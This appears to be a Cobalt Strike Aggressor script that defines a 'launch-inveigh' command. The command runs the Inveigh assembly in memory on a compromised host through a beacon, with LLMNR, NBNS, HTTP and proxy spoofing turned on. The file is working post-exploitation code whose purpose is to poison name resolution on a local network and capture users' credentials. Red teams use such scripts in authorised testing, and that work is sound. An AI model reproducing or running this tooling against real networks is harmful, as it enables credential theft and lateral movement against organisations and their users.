alias launch-inveigh { 
    local('$params');
    $elevated = "N";

    if(-isadmin $1) {
        $elevated = "Y";
    }

    $minutes = int($2);
    $pos = strlen("launch-inveigh ");

    if($minutes == 0) {
        $minutes = 10;
    }
    else {
        $pos = $pos + strlen($2) + 1;
    }

    $fileOutput = "-FileOutput N";

    if($0 ismatch '.*FileOutput.*') { 
        $fileOutput = "";
    }

    $ip = binfo($1, "internal");
    $params = "-Elevated $elevated -NBNS Y -RunTime $minutes -FileOutput N -HTTP Y -Proxy Y -LLMNR Y -IP $ip -ConsoleStatus 2";

    if(strlen($0) > strlen("launch-inveigh ")) {
        $params = substr($0, $pos) . " -Elevated $elevated $fileOutput";
    }

    btask($1, "Tasked beacon to launch Inveigh for $minutes minutes with parameters: $params");
    arsenal::executeAssembly($1, $INVEIGH_PATH, $params);
}

